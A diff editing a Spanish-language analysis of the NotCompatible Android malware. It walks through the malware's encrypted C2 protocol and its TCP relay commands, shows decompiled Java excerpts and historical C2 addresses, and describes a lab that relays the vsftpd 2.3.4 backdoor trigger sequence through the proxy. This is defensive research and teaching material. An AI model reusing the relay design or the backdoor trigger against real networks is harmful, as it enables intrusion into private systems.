@@ -1,18 +1,20 @@
-NotCompatible es una familia de malware para Android capaz de utilizar el dispositivo infectado como intermediario entre su infraestructura de control y otros servicios de red, una capacidad documentada en el [análisis publicado por Lookout](https://web.archive.org/web/20160605032711/https://blog.lookout.com/blog/2014/11/19/notcompatible/). Para la captura se selecciona el recorrido que comienza en el servidor inicial integrado en la muestra, continúa con el cambio a un C2 operacional y termina con la apertura de dos canales TCP hacia un servicio FTP y la puerta trasera que este habilita.
+NotCompatible es una familia de malware para Android capaz de utilizar el dispositivo infectado como intermediario entre su infraestructura de control y otros servicios de red, una capacidad documentada en el [análisis publicado por Lookout](https://web.archive.org/web/20160605032711/https://blog.lookout.com/blog/2014/11/19/notcompatible/). 
 
-El comportamiento permite estudiar **T1604 - Proxy Through Victim**, ya que el C2 ordena al teléfono crear conexiones hacia destinos arbitrarios y transporta datos a través de ellas. El segundo canal reproduce de forma inocua **T1428 - Exploitation of Remote Services**, técnica que [MITRE ATT&CK atribuye a NotCompatible](https://attack.mitre.org/software/S0299/). La página de la familia no incluye T1604 como procedimiento, pero la correspondencia se sostiene directamente en la implementación de `CONN`, `SEND` y `RECV` de esta variante.
+El comportamiento permite estudiar **T1604 - Proxy Through Victim**, ya que el C2 ordena al teléfono crear conexiones hacia destinos arbitrarios y transporta datos a través de ellas. El segundo canal reproduce de forma inocua **T1428 - Exploitation of Remote Services**, técnica que [MITRE ATT&CK atribuye a NotCompatible](https://attack.mitre.org/software/S0299/). Aquí MITRE comete un error al no incluir **T1604** como procedimiento, pero la correspondencia se sostiene directamente en la implementación de `CONN`, `SEND` y `RECV` de esta variante.
 
-La muestra utiliza el mismo protocolo binario tanto con el servidor inicial como con los servidores recibidos posteriormente. En este documento se denomina *gateway* al servidor integrado del grupo 0 y C2 operacional al servidor del grupo 1 utilizado en el laboratorio. Esta separación describe su función dentro del flujo seleccionado; el código no demuestra por sí solo que los grupos respondan a criterios geográficos ni que se empleen necesariamente para balanceo de carga.
+La muestra utiliza el mismo protocolo binario tanto con el servidor inicial como con los servidores recibidos posteriormente. En este documento se denomina *gateway* al servidor integrado del grupo 0 y C2 operacional al servidor del grupo 1. En resumen, el protocolo de C&C depende de más de una entidad de control. Lookout menciona que esta división del canal C&C tiene como objetivo aplicar mecanismos de balanceo de carga. Un diagrama de la topología de red usada por esta familia de malware es:
+
+![Captura del análisis de NotCompatible](<images/NotCompatible_Operations.png>)
 
 ### Análisis estático
 
-| Artefacto | Tipo | Identificación | SHA-256 |
-|---|---|---|---|
+| Artefacto               | Tipo           | Identificación                                                        | SHA-256                                                            |
+| ----------------------- | -------------- | --------------------------------------------------------------------- | ------------------------------------------------------------------ |
 | `221029-lh8ctsagh2.bin` | APK de Android | Paquete `com.security.patch`; versión 1.0; API mínima 7 y objetivo 17 | `c3e39aa0accae116946ead64339eac1753faf3e39d6df1d8185aae21f6135f37` |
 
-El archivo conserva la extensión `.bin`, pero su contenido es un APK válido. El manifiesto registra el servicio `com.security.patch.main` y el receptor `com.security.patch.Receiver`, que puede iniciarlo tras `BOOT_COMPLETED` o `USER_PRESENT`. Para facilitar la lectura, los extractos omiten manejo accesorio de excepciones y pueden asignar nombres descriptivos a variables locales; las condiciones y operaciones relevantes se conservan.
+El archivo tiene la extensión `.bin`, pero su contenido es un APK válido. El manifiesto registra el servicio `com.security.patch.main` y el receptor `com.security.patch.Receiver`, que puede iniciarlo tras `BOOT_COMPLETED` o `USER_PRESENT`. Para facilitar la lectura, los extractos omiten manejo accesorio de excepciones y pueden asignar nombres descriptivos a variables locales; las condiciones y operaciones relevantes se conservan.
 
-La clase `ThreadServer` reúne los tres componentes que condicionan el tráfico: el selector de Java NIO, la conexión de control representada por `link` y la lista de conexiones entre pares. Su constructor no abre todavía ningún socket:
+La clase `ThreadServer` reúne los tres componentes que condicionan el tráfico: el selector de Java NIO, la conexión de control representada por `link` y la lista de conexiones entre pares. Su constructor no abre ningún socket:
 
 ```java
 public ThreadServer(Object owner) {
@@ -27,7 +29,7 @@ public ThreadServer(Object owner) {
 }
 ```
 
-El método `ThreadServer.init()` prepara dos usos diferentes de RSA. El objeto `RSAGlobal` carga desde `res/raw/pub` un módulo público de 1024 bits y fija el exponente 65537; se utiliza exclusivamente para validar las configuraciones `SET`. El objeto `RSALocal` genera una pareja nueva de 1024 bits durante la ejecución y protege la entrega de las claves RC4 empleadas en las sesiones de control.
+El método `ThreadServer.init()` prepara dos usos diferentes de RSA. El objeto `RSAGlobal` carga desde `res/raw/pub` un módulo público de 1024 bits y fija el exponente 65537; se utiliza exclusivamente para validar las configuraciones `SET` (se comentará más adelante). El objeto `RSALocal` genera una pareja nueva de 1024 bits durante la ejecución y protege la entrega de las claves RC4 empleadas en las sesiones de control.
 
 ```java
 public void init() {
@@ -62,7 +64,7 @@ public void init() {
 }
 ```
 
-La configuración inicial se encuentra dentro del APK, en `res/raw/data`. La clase `config` la descifra mediante RC4 con una clave de veinte octetos nulos y deserializa los paquetes resultantes. El recurso contiene estos valores:
+La configuración inicial se encuentra dentro del APK, en `res/raw/data`. La clase `config` la descifra mediante RC4 con una clave de veinte octetos nulos y deserializa los paquetes resultantes. El recurso de configuración de tipo "SET" contiene estos valores:
 
 ```text
 SET
@@ -101,7 +103,7 @@ if (this.pac.getByName("PORT") == null) {
 }
 ```
 
-El primer extremo remoto está, por tanto, fijado como `173.242.124.163:443`. El número de puerto no implica HTTPS: la muestra abre un socket TCP y no produce un `ClientHello`, registros TLS ni mensajes HTTP. Tampoco basta para aplicar **T1509 - Non-Standard Port**, porque el protocolo propietario no dispone de un puerto normalizado con el que exista una asociación discordante.
+El primer extremo remoto está, por tanto, fijado como `173.242.124.163:443`. El número de puerto no implica HTTPS: la muestra abre un socket TCP y no produce un `ClientHello`, registros TLS ni mensajes HTTP. Tampoco basta para aplicar **T1509 - Non-Standard Port**, porque el protocolo de aplicación usado es propietario de la aplicación.
 
 La clase `ConectionManager` transforma cada elemento `GROUP` de la configuración en una lista de servidores. Un servidor puede definirse mediante la pareja `IP` y `PORT` o mediante un objeto `DOM` con `NAME` y `PORT`. La configuración integrada solo contiene una dirección IPv4, de modo que el primer enlace no requiere DNS. Una configuración posterior sí puede introducir nombres que Java resolverá al construir el `InetSocketAddress`.
 
@@ -116,7 +118,7 @@ GROUP
     └── PORT
 ```
 
-El código también abre listeners TCP y UDP para comunicaciones P2P, conserva listas `HUBLIST` y `UDPHUBLIST`, y puede intercambiar configuraciones con otros pares. Estas capacidades existen, pero no intervienen en el flujo aprobado para el laboratorio. No es necesario atribuirles una finalidad concreta para explicar el canal de control y el relé TCP.
+El código también abre listeners TCP y UDP para comunicaciones P2P, conserva listas `HUBLIST` y `UDPHUBLIST`, y puede intercambiar configuraciones con otros pares. Estas capacidades existen, pero no aportan nada para las técnicas que se buscan estudiar con esta muestra. 
 
 El bucle principal consulta la conectividad, procesa los eventos del selector y, si no hay una conexión de control activa, intenta conectarse al servidor seleccionado cada diez segundos:
 
@@ -172,14 +174,21 @@ public void onConnect(SelectionKey key) throws IOException {
 
 Esto implica que el primer mensaje de aplicación tendrá normalmente 132 bytes:
 
-```text
-u32le(128) || MODULO_RSA_LOCAL_DE_128_BYTES
+```mermaid
+%%{init: {"packet": {"bitsPerRow": 32, "bitWidth": 20, "rowHeight": 50, "showBits": false}}}%%
+packet
+    +8: "u32length(Valor:128)"
+    +24: "MODULO_RSA_LOCAL_DE_128_BYTES"
 ```
 
-El servidor reconstruye la clave pública con el exponente 65537, genera una clave RC4 de 100 bytes y la cifra mediante RSA sin relleno. El texto RSA contiene un octeto inicial que el cliente descarta, seguido de los 100 bytes de RC4. La respuesta repite el mismo encuadre de longitud y criptograma:
+El servidor reconstruye la clave pública con el exponente 65537, genera una clave RC4 de 100 bytes y la cifra mediante RSA sin relleno. El texto RSA contiene un octeto inicial que el cliente descarta, seguido de los 100 bytes de RC4. La respuesta repite la misma estructura de longitud y criptograma:
 
-```text
-u32le(128) || RSA_RAW(MARCADOR || CLAVE_RC4_DE_100_BYTES)
+```mermaid
+%%{init: {"packet": {"bitsPerRow": 32, "bitWidth": 20, "rowHeight": 50, "showBits": false}}}%%
+packet
+    +8: "u32le(128)"
+    +8: "MARCADOR"
+    +16: "CLAVE_RC4_DE_100_BYTES"
 ```
 
 El método `link.onRead()` descifra esa respuesta con la clave privada de `RSALocal`, construye dos objetos RC4 con la misma clave y activa el cifrado del canal. Cada objeto mantiene un estado continuo e independiente para uno de los sentidos; RC4 no se reinicia al comenzar cada paquete.
@@ -213,11 +222,13 @@ if (this.status == 2 && this.readBuffer.Size > 4) {
 
 A partir de este punto, los mensajes de control se serializan como una sucesión de paquetes binarios. Cada paquete comienza por su tamaño total en *little-endian*. El octeto siguiente reserva el bit más significativo para indicar si existen hijos y emplea los siete bits restantes como longitud de la etiqueta ASCII:
 
-```text
-u32le  tamaño total
-u8     bit 7: contiene hijos; bits 0-6: longitud de etiqueta
-ASCII  etiqueta
-bytes  datos sin procesar o paquetes hijo concatenados
+```mermaid
+%%{init: {"packet": {"bitsPerRow": 32, "bitWidth": 20, "rowHeight": 50, "showBits": false}}}%%
+packet
+    +6: "u32le tamaño"
+    +6: "u8 hijos/long."
+    +8: "ASCII etiqueta"
+    +12: "datos/hijos"
 ```
 
 La primera estructura cifrada que envía el dispositivo es `HELO`:
@@ -313,9 +324,9 @@ SET
 └── Sign
 ```
 
-Después, `SETGROUP` contiene el identificador de dos bytes del grupo que debe seleccionarse. La muestra guarda el valor, cierra la conexión actual y vuelve al bucle principal. En el laboratorio, el gateway anuncia el grupo 1 y el siguiente intento se dirige al C2 operacional incorporado en el `SET`. La nueva conexión repite el intercambio `RSALocal`, negocia una clave RC4 distinta y envía otro `HELO`, ya con `GROUP=1` y sin `FB`.
+Después, `SETGROUP` contiene el identificador de dos bytes del grupo que debe seleccionarse. La muestra guarda el valor, cierra la conexión actual y vuelve al bucle principal. Existe una manera sencilla de cubrir el traspaso Pasarela-Servidor C&C. El gateway anuncia el grupo 1 y el siguiente intento se dirige al C2 operacional incorporado en el `SET`. La nueva conexión repite el intercambio `RSALocal`, negocia una clave RC4 distinta y envía otro `HELO`, ya con `GROUP=1` y sin `FB`.
 
-La operación de proxy no reproduce SOCKS4 ni SOCKS5. Es un relé TCP de aplicación multiplexado por el campo `CH`. El C2 solicita un nuevo socket mediante `CONN`, que debe incluir un identificador de canal de cuatro bytes, un puerto de dos bytes en orden de red y una dirección IPv4 o un dominio:
+Como casi todo en este malware, también se hace uso de un protocolo propietario para el relé y por lo tanto no usa SOCKS4/SOCKS5 (la cual suele ser la implementación clásica de un Proxy en malware móvil). En resumen, es un relé TCP de aplicación multiplexado por el campo `CH`. El C2 solicita un nuevo socket mediante `CONN`, que debe incluir un identificador de canal de cuatro bytes, un puerto de dos bytes en orden de red y una dirección IPv4 o un dominio:
 
 ```text
 CONN
@@ -381,7 +392,7 @@ SEND
 └── DT    = bytes que se escribirán en el socket remoto
 ```
 
-Cuando el servicio remoto responde, `ProxyLink.onRead()` encapsula los bytes leídos en `RECV` y los devuelve al C2 por el canal RC4:
+Es decir, la transmisión de esta simple estructura lógica tras generar los dos flujos TCP permitiría a los operadores del malware ejecutar un DDOS (ataque de denegación de servicio distribuido) o aprovechar vulnerabilidades de redes privadas en las que se encuentre la víctima (donde entra la siguiente técnica a estudiar precisamente). Cuando el servicio remoto responde, `ProxyLink.onRead()` encapsula los bytes leídos en `RECV` y los devuelve al C2 por el canal RC4:
 
 ```java
 public void onRead(SelectionKey key) throws IOException {
@@ -411,11 +422,11 @@ RECV
 
 El C2 puede mantener varios canales simultáneos porque cada uno utiliza un valor `CH` diferente. La orden `SHUT` solicita el cierre de uno de ellos. Debido a la comprobación concreta de `RecvSHUT()`, el paquete debe contener también un hijo `DT`, aunque puede estar vacío y su contenido no se utilice. Tras cerrar el socket, la víctima responde `DISC` con el identificador correspondiente.
 
-Esta cadena demuestra **T1604**: el C2 no establece directamente la conexión con el servicio final; la orden cifrada provoca que el dispositivo abra otro flujo y retransmita en ambos sentidos los datos asociados al canal. La existencia del relé no demuestra por sí sola **T1428**. Esa segunda técnica se materializa cuando los campos `DT` contienen una conversación que explota un servicio remoto, tal como ocurre en el laboratorio.
+Esta cadena demuestra **T1604**: el C2 no establece directamente la conexión con el servicio final; la orden cifrada provoca que el dispositivo abra otro flujo y retransmita en ambos sentidos los datos asociados al canal. La existencia del relé no demuestra por sí sola **T1428**. Esa segunda técnica se materializa cuando los campos `DT` contienen una conversación que explota un servicio remoto. Se seleccionará un ataque documentado para el estudio de esta técnica sobre el protocolo de relé.
 
 ### Secuencia comunicativa
 
-El laboratorio emula en Python el gateway, el C2 operacional, la víctima y el servicio FTP. No ejecuta el APK porque los servidores necesitan firmar `SET` con la clave privada correspondiente a `RSAGlobal`, mientras que la muestra solo incorpora el módulo público. Sin esa clave privada, un `SET` construido por el laboratorio sería rechazado. Emular la víctima permite utilizar una pareja controlada sin parchear ni presentar como original una muestra modificada.
+El laboratorio emula en Python la pasarela, el C2 operacional, la víctima y el servicio FTP. No ejecuta el APK porque los servidores necesitan firmar `SET` con la clave privada correspondiente a `RSAGlobal`, mientras que la muestra solo incorpora el módulo público. Sin esa clave privada, un `SET` construido por el laboratorio sería rechazado. También se podría modificar la muestra para solucionar el problema de llaves y usar un par controlado. El conocimiento del protocolo usado por el malware es bastante claro, por lo que emularlo todo es una vía completamente válida. Las entidades de red se han configurado tal que así:
 
 | Entidad | Dirección y servicio | Procedencia |
 |---|---|---|
@@ -423,12 +434,11 @@ El laboratorio emula en Python el gateway, el C2 operacional, la víctima y el s
 | Gateway inicial | `173.242.124.163:443` | Extremo integrado en la configuración de la muestra y confirmado por el [informe de CERT Orange Polska de 2014](https://cert.orange.pl/wp-content/uploads/2023/05/Raport_CERT_OPL_2014.pdf), que lo identifica como el primer C2. |
 | C2 operacional | `5.45.65.100:80` | Uno de los C2 alternativos mostrados en la figura 48 del [informe de CERT Orange Polska de 2014](https://cert.orange.pl/wp-content/uploads/2023/05/Raport_CERT_OPL_2014.pdf). |
 | Objetivo FTP | `10.29.9.20:21` y `10.29.9.20:6200` | Host privado controlado dentro de la red de la víctima. Lo elige el escenario para materializar el uso del proxy y no se presenta como infraestructura de NotCompatible. |
+El servicio remoto reproduce de forma segura [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523), correspondiente al tarball comprometido de vsftpd 2.3.4 que abría una puerta trasera en TCP/6200. La secuencia se basa en el [módulo publicado por Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/): se envía un nombre de usuario que contiene `:)`, se completa `PASS` y después se intenta una segunda conexión al puerto 6200. El emulador únicamente responde de forma controlada a `id`.
 
-El gateway conserva TCP/443 y el C2 operacional usa TCP/80, tal como aparece en el flujo alternativo documentado. Ninguno de esos puertos implica TLS: tras el intercambio RSA, ambos canales transportan directamente el flujo binario cifrado con RC4. El objetivo controlado utiliza TCP/21 para FTP y TCP/6200 para la puerta trasera simulada.
+El gateway conserva TCP/443 y el C2 operacional usa TCP/80, tal como aparece en el flujo  documentado. Ninguno de esos puertos implica TLS: tras el intercambio RSA, ambos canales transportan directamente el flujo binario cifrado con RC4. El objetivo controlado utiliza TCP/21 para FTP y tal como se comentó, TCP/6200 para la puerta trasera simulada.
 
-El servicio remoto reproduce de forma segura [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523), correspondiente al tarball comprometido de vsftpd 2.3.4 que abría una puerta trasera en TCP/6200. La secuencia se basa en el [módulo publicado por Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/): se envía un nombre de usuario que contiene `:)`, se completa `PASS` y después se intenta una segunda conexión al puerto 6200. El emulador no ejecuta órdenes arbitrarias; únicamente responde de forma controlada a `id`.
-
-El gateway envía un `SET` firmado con `LID=2` y `SETGROUP=1`. La víctima cierra el primer canal y se conecta al C2 operacional, que distribuye un segundo `SET` con `LID=3`. A continuación, el C2 abre `CH=1` hacia `10.29.9.20:21` y transporta estas primitivas FTP mediante `SEND`:
+Siguiendo el protocolo usado por el malware, la pasarela enviará un `SET` firmado con `LID=2` y `SETGROUP=1`. La víctima cierra el primer canal y se conecta al C2 operacional, que distribuye un segundo `SET` con `LID=3`. A continuación, el C2 abre `CH=1` hacia `10.29.9.20:21` y transporta estas primitivas FTP mediante `SEND`:
 
 ```text
 USER lab:)\r\n
@@ -485,9 +495,3 @@ sequenceDiagram
     C2-->>V: SHUT cifrado (CH=1, DT vacío)
     V->>C2: DISC cifrado (CH=1)
 ```
-
-### Laboratorio de generación del PCAP
-
-Este escenario está automatizado en `python-labnet` con el identificador `notcompatible`. La ejecución, la captura y la recopilación del material RSA se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).
-
-El C2 muestra `LAB FLOW COMPLETED SUCCESSFULLY` cuando ha recibido la prueba inocua, ha cerrado los dos canales y ha completado el flujo. 
